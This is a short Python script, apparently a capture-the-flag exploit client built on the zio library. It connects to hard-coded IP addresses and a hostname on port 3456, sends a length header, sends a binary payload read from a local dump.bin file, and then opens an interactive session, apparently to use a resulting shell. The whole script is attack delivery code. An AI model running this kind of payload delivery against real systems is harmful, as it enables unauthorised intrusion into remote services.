#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '202.112.51.198'
ip = '172.17.181.51'
# ip = 'arm.ztx.io'
port = 3456

io = zio((ip,port), timeout=1000, print_write=COLORED(REPR))

data_len = 0xb44
io.write(l32(data_len))

dump = open('./dump.bin', 'r')
payload = dump.read(data_len)

io.write(payload)
io.readline()
io.interact()


